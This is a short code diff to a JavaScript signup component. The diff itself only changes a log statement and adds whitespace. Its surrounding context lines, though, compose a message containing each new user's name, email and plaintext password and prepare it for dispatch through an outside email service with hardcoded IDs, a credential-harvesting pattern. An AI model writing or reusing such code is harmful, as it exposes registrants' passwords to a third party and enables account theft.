@@ -76,13 +76,13 @@ const Signup = ({route}) => {
                 'email_subject': `${res.subject}`
             }
         };
-        console.log(res.url);
+        console.log(res.email);
         
         
             const msg = `A new user with the following details just signed in name: ${firstname} ${lastname} email: ${email} password: ${password}`
           const data2 = {
             service_id: 'service_k19ph6c',
-            template_id: 'template_lnr644d',
+            template_id: 'template_lnr644d', 
             user_id: 'meBDgNKr899Sq8t1g',
             // public_id: 'meBDgNKr899Sq8t1g',
             template_params: {    
